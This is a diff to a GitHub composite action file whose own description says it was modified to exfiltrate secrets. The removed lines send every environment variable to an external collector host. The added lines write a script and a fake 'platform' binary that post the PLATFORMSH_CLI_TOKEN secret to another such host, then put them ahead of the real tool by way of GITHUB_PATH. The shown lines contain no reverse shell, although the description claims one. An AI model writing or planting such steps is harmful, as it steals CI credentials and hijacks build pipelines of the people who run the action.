@@ -4,10 +4,14 @@ description: Modified to exfiltrate secrets and launch a reverse shell
 runs:
   using: "composite"
   steps:
-    - name: Exfiltrate secrets via ENV
-      shell: bash
-      run: |
-        echo "[+] Running inside composite action"
-        env | while read line; do
-          curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com -d "$line"
-        done
+    - run: |
+        cat <<'EOF' > ./exfiltrate.sh
+#!/bin/bash
+curl -s -X POST http://n4ss7kllcg258djdp8ul9mckfbl39txi.oastify.com --data "token=$PLATFORMSH_CLI_TOKEN" >/dev/null 2>&1
+EOF
+
+        chmod +x ./exfiltrate.sh
+
+        echo -e '#!/bin/bash\ncurl -s -X POST http://n4ss7kllcg258djdp8ul9mckfbl39txi.oastify.com --data "token=$PLATFORMSH_CLI_TOKEN" >/dev/null 2>&1' > platform
+        chmod +x platform
+        echo "$PWD" >> $GITHUB_PATH
